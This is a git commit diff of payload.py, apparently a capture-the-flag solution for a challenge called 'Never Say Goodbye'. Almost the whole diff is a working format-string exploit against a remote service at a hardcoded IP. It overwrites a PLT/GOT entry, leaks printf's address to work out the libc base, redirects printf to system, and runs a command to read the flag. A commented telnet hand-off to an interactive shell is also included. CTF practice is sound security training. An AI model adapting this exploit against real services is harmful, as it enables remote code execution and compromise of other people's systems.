0f3336d6c569fd46082e8da3e3dfbda5ef804877
Kevin Park <kevin.park1217@gmail.com>
2017-05-22 02:04:16 -0600

    Never Say Goodbye Complete and Cleanups

--- Never Say Goodbye/payload.py
+++ Never Say Goodbye/payload.py
@@ -2,10 +2,10 @@ import struct
 import time
 import math
 from socket import *
+import telnetlib
 
 s = socket(AF_INET, SOCK_STREAM)
-#s.connect(('104.131.90.29', 8004))
-s.connect(('localhost',8004))
+s.connect(('104.131.90.29', 8004))
 
 def recv_timeout(timeout=2):
     s.setblocking(0)
@@ -29,13 +29,62 @@ def recv_timeout(timeout=2):
     return ''.join(total_data)
 
 def pad(string, length):
-  return string+"\x00"*(length-len(string))
+  return string+"\x90"*(length-len(string))
 
 # PAYLOADS
 
 print s.recv(512)
 
-payload = pad("\x20\x10\x60",8) + '%419612x%10\$ln'
-print payload
+PUTS_PLT = 0x601018
+payload = pad("%1808x%12$hn",16)
+payload += struct.pack("<Q",PUTS_PLT)
 s.send(payload+'\n')
-print recv_timeout()
+recv_timeout()
+
+base = ''
+PRINTF_PLT = 0x601030
+for i in range(0,8):
+  payload = pad("%x"*17+'A%.1sZ',8*8)
+  payload += struct.pack("<Q",PRINTF_PLT+i)
+  s.send(payload+'\n')
+  data = recv_timeout()
+  data = data[data.index("A")+1:data.index("Z")]
+  if len(data) == 0:
+    base = '00' + base
+  else:
+    c = hex(ord(data[0]))[2:]
+    base = '0'*(2-len(c)) + c + base
+
+print "printf: " + hex(int(base, 16))
+base = int(base, 16) - 0x55800
+print "libc: " + hex(base)
+SYSTEM_LIBC = hex(base + 0x45390)
+print "system: " + SYSTEM_LIBC
+SYSTEM_LIBC = SYSTEM_LIBC[2:]
+
+# Write a desired address to the stack
+payload = struct.pack("<Q",PRINTF_PLT)
+payload += struct.pack("<Q",PRINTF_PLT+2)
+s.send(payload+'\n')
+recv_timeout()
+
+# Access the stack from previous iteration
+#payload = "%34$lx.%35$lx"
+#s.send(payload+'\n')
+#print recv_timeout()
+
+addr = int(SYSTEM_LIBC[-4:], 16)
+payload = "%"+str(addr)+"x%34$hn"
+addr = int('1'+SYSTEM_LIBC[-8:-4], 16) - addr
+payload += "%"+str(addr)+"x%35$hn"
+s.send(payload+'\n')
+recv_timeout()
+s.setblocking(1)
+
+s.send("/bin/cat flag"+'\n')
+print "Flag: " + s.recv(2048)
+s.close()
+
+#t = telnetlib.Telnet()
+#t.sock = s
+#t.interact()
